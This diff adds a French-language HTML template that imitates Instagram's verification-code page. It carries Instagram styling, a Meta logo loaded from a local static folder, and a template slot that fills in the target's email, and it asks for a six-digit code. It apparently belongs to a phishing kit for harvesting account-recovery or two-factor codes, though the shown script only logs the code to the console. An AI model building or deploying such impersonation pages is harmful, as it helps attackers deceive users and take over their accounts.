@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérifier votre numéro - Instagram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #ffffff;
+            --bg-secondary: #fafafa;
+            --text-primary: #262626;
+            --text-secondary: #8e8e8e;
+            --border-color: #dbdbdb;
+            --input-bg: #fafafa;
+            --button-bg: #0095f6;
+            --button-hover: #1877f2;
+            --link-color: #0095f6;
+            --selected-bg: rgba(0, 149, 246, 0.1);
+        }
+
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-primary: #1d1d25;
+                --bg-secondary: #1c2a33;
+                --text-primary: #f5f5f5;
+                --text-secondary: #a8a8a8;
+                --border-color: #344f5c;
+                --input-bg: #1c2a33;
+                --button-bg: #0064E0;
+                --button-hover: #1877f2;
+                --link-color: #e0f1ff;
+                --selected-bg: rgba(0, 100, 224, 0.15);
+            }
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-secondary);
+            color: var(--text-primary);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+        }
+
+        .back-button {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 28px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--text-primary);
+            padding: 0;
+        }
+
+        .recovery-box {
+            background-color: var(--bg-primary);
+            border: 1px solid var(--border-color);
+            border-radius: 1px;
+            padding: 40px 20px;
+            margin-bottom: 16px;
+        }
+
+        .title {
+            font-size: 32px;
+            font-weight: 600;
+            margin-bottom: 28px;
+            color: var(--text-primary);
+            line-height: 1.2;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        .phone-number {
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 14px;
+            color: var(--text-primary);
+            font-family: 'Courier New', monospace;
+            letter-spacing: 4px;
+            text-align: center;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: var(--button-bg);
+            background-color: var(--bg-primary);
+        }
+
+        .help-text {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 13px;
+        }
+
+        .help-link {
+            color: var(--link-color);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        .continue-button {
+            width: 100%;
+            height: 44px;
+            background-color: var(--button-bg);
+            color: white;
+            border: none;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+
+        .continue-button:hover {
+            background-color: var(--button-hover);
+        }
+
+        .continue-button:active {
+            opacity: 0.8;
+        }
+
+        .alternative-button {
+            width: 100%;
+            height: 44px;
+            background-color: transparent;
+            color: var(--link-color);
+            border: 2px solid var(--border-color);
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 12px;
+        }
+
+        .alternative-button:hover {
+            border-color: var(--link-color);
+            background-color: var(--selected-bg);
+        }
+
+        .signup-box {
+            width: 100%;
+            background-color: var(--bg-primary);
+            border: 1px solid var(--border-color);
+            border-radius: 1px;
+            padding: 25px 40px;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 16px;
+        }
+
+        .signup-box a {
+            color: var(--button-bg);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-box a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            width: 100%;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .meta-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .meta-logo img {
+            height: 20px;
+            width: auto;
+        }
+
+        @media (max-width: 450px) {
+            .back-button {
+                left: 15px;
+                top: 15px;
+            }
+
+            .recovery-box {
+                padding: 30px 16px;
+                border: none;
+                background-color: transparent;
+            }
+
+            .title {
+                font-size: 28px;
+            }
+
+            .signup-box {
+                padding: 20px 16px;
+                border: none;
+                background-color: transparent;
+            }
+        }
+    </style>
+</head>
+<body>
+    <button class="back-button">‹</button>
+
+    <div class="container">
+        <!-- Recovery Box -->
+        <div class="recovery-box">
+            <div class="title">Nous enverrons un code ou un lien au</div>
+            {%if email %}
+            <div class="subtitle"><span class="phone-number">{{email}}</span></div>
+            {%endif%}
+            
+            <div class="subtitle">Nous voulons nous assurer que vous avez toujours accès à ce numéro de mobile. Si ce n'est pas le cas, essayez de confirmer votre compte autrement.</div>
+
+            <!-- Code Input -->
+            <div class="input-group">
+                <label class="input-label">Code de vérification</label>
+                <input type="text" class="code-input" placeholder="000000" maxlength="6">
+            </div>
+
+            <!-- Continue Button -->
+            <button class="continue-button">Continuer</button>
+
+            <!-- Alternative Button -->
+            <button class="alternative-button">Essayer d'une autre façon</button>
+
+            <!-- Help Text -->
+            <div class="help-text">
+                <a class="help-link">Vous n'avez pas reçu le code ?</a>
+            </div>
+        </div>
+
+        <!-- Sign Up Box -->
+        <div class="signup-box">
+            Vous n'avez pas de compte ? <a href="#">Créer un compte</a>
+        </div>
+
+        <!-- Meta Logo -->
+        <div class="footer">
+            <div class="meta-logo">
+                <img src="../static/Logo2.png" alt="Meta">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Back button functionality
+        document.querySelector('.back-button').addEventListener('click', () => {
+            window.history.back();
+        });
+
+        // Code input handler
+        const codeInput = document.querySelector('.code-input');
+        
+        codeInput.addEventListener('input', (e) => {
+            // Allow only numbers
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            
+            // Auto-submit if 6 digits are entered
+            if (e.target.value.length === 6) {
+                console.log('Code entered:', e.target.value);
+                // Automatically proceed or trigger verification
+            }
+        });
+
+        // Continue button
+        document.querySelector('.continue-button').addEventListener('click', () => {
+            const code = codeInput.value;
+            if (code.length === 6) {
+                console.log('Verifying code:', code);
+                // Handle verification
+            } else {
+                alert('Veuillez entrer un code de 6 chiffres');
+            }
+        });
+
+        // Alternative method button
+        document.querySelector('.alternative-button').addEventListener('click', () => {
+            console.log('User requested alternative method');
+            // Go back to methods selection
+            window.history.back();
+        });
+
+        // Help link
+        document.querySelector('.help-link').addEventListener('click', () => {
+            console.log('User needs help with code reception');
+            // Handle help request
+        });
+    </script>
+</body>
+</html>
